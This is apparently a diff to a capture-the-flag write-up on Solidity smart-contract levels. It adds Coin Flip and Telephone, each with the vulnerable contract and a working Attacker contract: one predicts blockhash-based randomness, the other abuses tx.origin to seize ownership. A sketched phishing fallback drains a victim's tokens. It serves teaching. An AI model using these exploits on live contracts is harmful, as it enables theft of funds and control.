@@ -149,7 +149,157 @@ This allowed the attacker to call the old constructor and claim ownership of the
 
 =========================
 
-3. Token
+3. Coin Flip
+
+=========================
+
+    pragma solidity ^0.4.18;
+
+    contract CoinFlip {
+    
+        uint256 public consecutiveWins;
+        uint256 lastHash;
+        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+        function CoinFlip() public {
+            consecutiveWins = 0;
+        }
+
+        function flip(bool _guess) public returns (bool) {
+        
+            uint256 blockValue = uint256(block.blockhash(block.number-1));
+
+            if (lastHash == blockValue) {
+                revert();
+            }
+
+            lastHash = blockValue;
+            uint256 coinFlip = blockValue / FACTOR;
+            bool side = coinFlip == 1 ? true : false;
+
+            if (side == _guess) {
+        
+                consecutiveWins++;
+                return true;
+            } else {
+                
+                consecutiveWins = 0;
+                return false;
+            }
+        }   
+    }
+
+
+=========================
+
+###Goal
+* This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.
+=========================
+
+### Solution
+
+* Since previous BlockHash is known, we can use it to calculate the correct answer for 
+    * uint256 coinFlip = blockValue / FACTOR;
+* Then call the flip() method with the correct guess
+    * CoinFlip(_coinflip).flip(guess)
+* Calling this attack method 10 times will get you to goal.
+
+contract Attacker{
+    
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    
+    function attack(address _cf) public {
+    
+         uint256 blockValue = uint256(block.blockhash(block.number-1));
+         uint256 coinFlip = blockValue / FACTOR;
+         bool guess = coinFlip == 1? true : false; 
+         require(address(_cf) != 0);
+         CoinFlip(_cf).flip(guess);
+    }
+}
+
+
+=========================
+
+###Message on completion
+
+Generating random numbers in solidity can be tricky. There currently isn't a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.
+
+Some options include using Bitcoin block headers (verified through BTC Relay), RANDAO, or Oraclize).
+
+=========================
+
+4. Telephone
+
+=========================
+
+    pragma solidity ^0.4.18;
+
+    contract Telephone {
+
+        address public owner;
+
+        function Telephone() public {
+            owner = msg.sender;
+        }
+
+        function changeOwner(address _owner) public {
+            if (tx.origin != msg.sender) {
+                owner = _owner;
+            }
+        }
+    }
+
+
+=========================
+
+###Goal
+* Claim ownership of the contract below to complete this level.
+
+=========================
+
+### Solution
+
+* The trick here is that tx.origin and msg.sender don't necessarily point to the same address
+* So, if we invoke the function changeOwner() from another contract, we have successfully hacked this.
+
+
+contract Attacker{
+    
+    
+    function attack(address _t) public{
+     
+      require(address(_t) != 0);
+      Telephone(_t).changeOwner(msg.sender);
+    }
+}
+
+=========================
+
+###Message on completion
+
+While this example may be simple, confusing tx.origin with msg.sender can lead to phishing-style attacks, such as this.
+
+An example of a possible attack is outlined below.
+
+    Use tx.origin to determine whose tokens to transfer, e.g.
+
+function transfer(address _to, uint _value) {
+  tokens[tx.origin] -= _value;
+  tokens[_to] += _value;
+}
+
+    Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.
+
+function () payable {
+  token.transfer(attackerAddress, 10000);
+}
+
+    In this scenario, tx.origin will be the victim's address (while msg.sender will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.
+
+=========================
+
+5. Token
 
 =========================
 
@@ -210,7 +360,7 @@ If there is an overflow, the code will revert.
 
 =========================
 
-4. Delegation
+6. Delegation
 
 =========================
 
@@ -270,7 +420,7 @@ Please refer to the The Parity Wallet Hack Explained article for an accurate exp
 
 =========================
 
-5. Force
+7. Force
 
 =========================
 
@@ -316,7 +466,7 @@ However, there is no way to stop an attacker from sending ether to a contract by
 
 =========================
 
-6. King
+9. King
 
 =========================
 
@@ -390,7 +540,7 @@ In this case, see: King of the Ether and King of the Ether Postmortem.
 
 =========================
 
-7. Re-entrancy
+10. Re-entrancy
 
 =========================
 
